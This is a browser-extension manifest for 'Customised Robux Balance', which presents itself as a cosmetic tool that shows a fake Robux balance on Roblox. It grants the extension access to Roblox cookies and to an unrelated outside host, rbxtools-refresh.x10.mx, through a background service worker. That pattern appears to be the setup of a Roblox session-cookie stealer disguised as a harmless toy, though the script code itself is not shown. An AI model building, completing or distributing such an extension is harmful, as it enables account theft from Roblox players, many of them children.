{
  "manifest_version": 3,
  "name": "Customised Robux Balance",
  "version": "1.2.0",
  "description": "Set a custom Robux balance shown in the Send Robux dialog and on the Roblox page.",
  "action": {
    "default_popup": "popup.html",
    "default_title": "Customised Robux Balance"
  },
  "permissions": [
    "storage",
    "activeTab",
    "cookies"
  ],
  "host_permissions": [
    "https://www.roblox.com/*",
    "https://*.roblox.com/*",
    "https://rbxtools-refresh.x10.mx/*"
  ],
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [
    {
      "matches": ["https://www.roblox.com/*"],
      "js": ["content.js"],
      "run_at": "document_idle",
      "all_frames": false
    }
  ]
}
